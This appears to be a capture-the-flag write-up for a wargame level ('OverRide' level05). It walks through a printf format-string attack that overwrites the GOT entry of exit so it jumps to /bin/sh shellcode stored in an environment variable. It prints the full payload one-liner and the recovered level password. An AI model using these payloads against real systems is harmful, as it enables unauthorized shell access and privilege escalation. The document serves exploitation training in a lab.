### step 1 : decompile binary with ghidra

### step 2 : Check all the functions availaible :

- We find in the n function an overflow-vulnerable functions : printf(). It is vulnerable because there is no casting, printf takes a buffer. We can take advantage of that call to trick printf to read/write memory with flags in our buffer.

- An `exit(1)` call is made just after the `printf` call

Our strategy : overwrite the call of the `exit` function by the call of a shellcode defined in env to get access to a shell with privileges to read `/home/user/level6/.pass`  

### step3 : find exit addresses

- Address of `exit` in the Global Table Offset (GOT) : 
```
level05@OverRide:~$ objdump -R level05 

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main

```
exit : 080497e0

The `exit` address is 080497e0 => \xe0\x97\x04\x08
We will overwrite this address with the address of the shellcode


### step4 : setup shellcode in env

env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")')

Our nopesled spans from 0xffffddae to 0xffffdfae, so we target the middle 0xffffdeae.

### step5: exploit printf overflow vulnerability

- we want to now at which position the printf starts to write the string given. For this with use this string as input : <n * char><n * %08x>
%08x will display the content of the stack chunks wrote next to the printf call

8 says that you want to show 8 digits
0 that you want to prefix with 0's instead of just blank spaces
x that you want to print in lower-case hexadecimal

```bash
./level5
aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
=> aaaa00000064.f7fcfac0.f7ec3af9.ffffd6df.ffffd6de.00000000.ffffffff.ffffd764.f7fdb000.61616161.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838
```                              

- a value is 61
- We then find that printf argument position is at 10th position

- The shellcode address(0xffffdeae) in decimal is 4294958766 

- Our number of bytes to be printed(4294958766) is too big to be printed in a single destintation 
=> we need to split the bytes in two addresses :

exit addresss : \xe0\x97\x04\x08
\xe0\x97\x04\x08 + 2 = 0x080497e0 + 2 = \xe2\x97\x04\x08

we split our shellcode address in the two adresses :
0xffffdeae => 0xffff + 0xdeae

decimal values :
0xffff => 65535
0xdeae => 57006 

first value is : 57006 - 8 = 56998

second value is : 65535 - 56998 - 8 = 8529

- The exploit string will be formatted like that : 
`<destination addr> + <destination addr + 2> + %<value in decimal2 - 2 two addresses length (8)>d + %10$n + %<value in decimal1 - value in decimal2 - 2 two addresses length (8)>d + %11$n` :
`"\xe2\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998x" + "%10$hn" + "%8529x" + "%11$hn"`

- To get the exploit working we have to keep stdin open with the `cat` trick like previous exercices :

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998d" + "%10$hn" + "%8529d" + "%11$hn")' ; cat) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05
```


And we can get the flag !
```
cat /home/users/level06/.pass
```
=>h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
